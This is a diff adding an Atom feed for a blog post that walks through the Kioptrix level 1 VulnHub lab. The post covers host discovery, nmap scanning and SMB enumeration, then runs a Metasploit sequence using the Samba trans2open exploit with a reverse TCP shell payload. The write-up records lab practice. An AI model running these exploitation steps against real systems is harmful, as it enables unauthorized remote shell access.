@@ -1,0 +1,84 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: smb | Bob1Bob2]]></title>
+  <link href="http://wg135.github.io/blog/categories/smb/atom.xml" rel="self"/>
+  <link href="http://wg135.github.io/"/>
+  <updated>2016-06-06T15:01:54-05:00</updated>
+  <id>http://wg135.github.io/</id>
+  <author>
+    <name><![CDATA[Bob1Bob2]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[vulhub-Kioptrix level 1]]></title>
+    <link href="http://wg135.github.io/blog/2016/06/06/vulhub-kioptrix-level-1/"/>
+    <updated>2016-06-06T09:21:18-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/06/06/vulhub-kioptrix-level-1</id>
+    <content type="html"><![CDATA[<p>From <a href="From%20[Vulhub](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/">Vulhub</a></p>
+
+<h3>Tools:</h3>
+
+<ul>
+<li>netdiscover</li>
+<li>Nmap</li>
+<li>nbtscab</li>
+<li>enum4linux</li>
+<li>Metasploit</li>
+</ul>
+
+
+<!--more-->
+
+
+<p>Use netdiscover to detect target IP address</p>
+
+<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>
+
+<p><img src="/images/blog/vulhub/kioptrix1/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>192.168.79.182 is the target.</p>
+
+<p>Then run nmap to detect opening ports and running services on the target machine.</p>
+
+<p><code>nmap -sV -v -O -A -T5 192.168.79.180 -p-</code></p>
+
+<p>Opening ports: 22, 111, 139, 80, 443, 1024.</p>
+
+<p><img src="/images/blog/vulhub/kioptrix1/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>SMB Attack:</p>
+
+<p>Looks like SMB service is on. Lets start nbtscan to exam SMB.</p>
+
+<p><code>nbtscan 192.168.79.182</code></p>
+
+<p><img src="/images/blog/vulhub/kioptrix1/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>use enum4linux to enumerate smb:</p>
+
+<p><code>enum4linux  -a 192.168.79.182</code></p>
+
+<p><img src="/images/blog/vulhub/kioptrix1/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get the samba version</p>
+
+<p>Now start Metasploit:</p>
+
+<pre><code>msfconsole
+use exploit/linux/samba/trans2open
+set rhost 192.168.79.182
+set payload generic/shell_reverse_tcp
+exploit
+</code></pre>
+
+<p><img src="/images/blog/vulhub/kioptrix1/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>DONE SMB</p>
+]]></content>
+  </entry>
+  
+</feed>
